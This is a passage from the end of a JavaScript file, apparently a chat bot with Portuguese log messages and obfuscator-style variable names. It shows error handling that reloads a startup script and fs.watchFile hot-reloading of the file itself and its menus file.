                    console.error("Sender não encontrado no array pushnames");
                  }
                }
              }
          }
        }
      }
      _0x233fc4().catch(async _0x181571 => {
        if (JSON.stringify(_0x181571).includes(_0x44a335, _0x512d5e)) {
          return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
        } else if (String(_0x181571).includes("Erro: aborted")) {
          file = require.resolve("./iniciar.js");
          delete require.cache[file];
          require(file);
        } else {
          return console.log(_0x181571);
        }
      });
    };
  };
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(colors.red("Alterações salvas - '" + __filename + "'"));
  delete require.cache[file];
  require(file);
});
const filemm = "./menus/menus/menus.js";
let filemenu = require.resolve(filemm);
fs.watchFile(filemenu, () => {
  fs.unwatchFile(filemenu);
  console.log(colors.red("Alterações salvas - '" + filemenu + "'"));
  delete require.cache[filemenu];
  require(filemenu);
});
startAle().catch(_0x1918c1 => {
  return console.log(_0x1918c1 + " -INDEX..ERROS");
});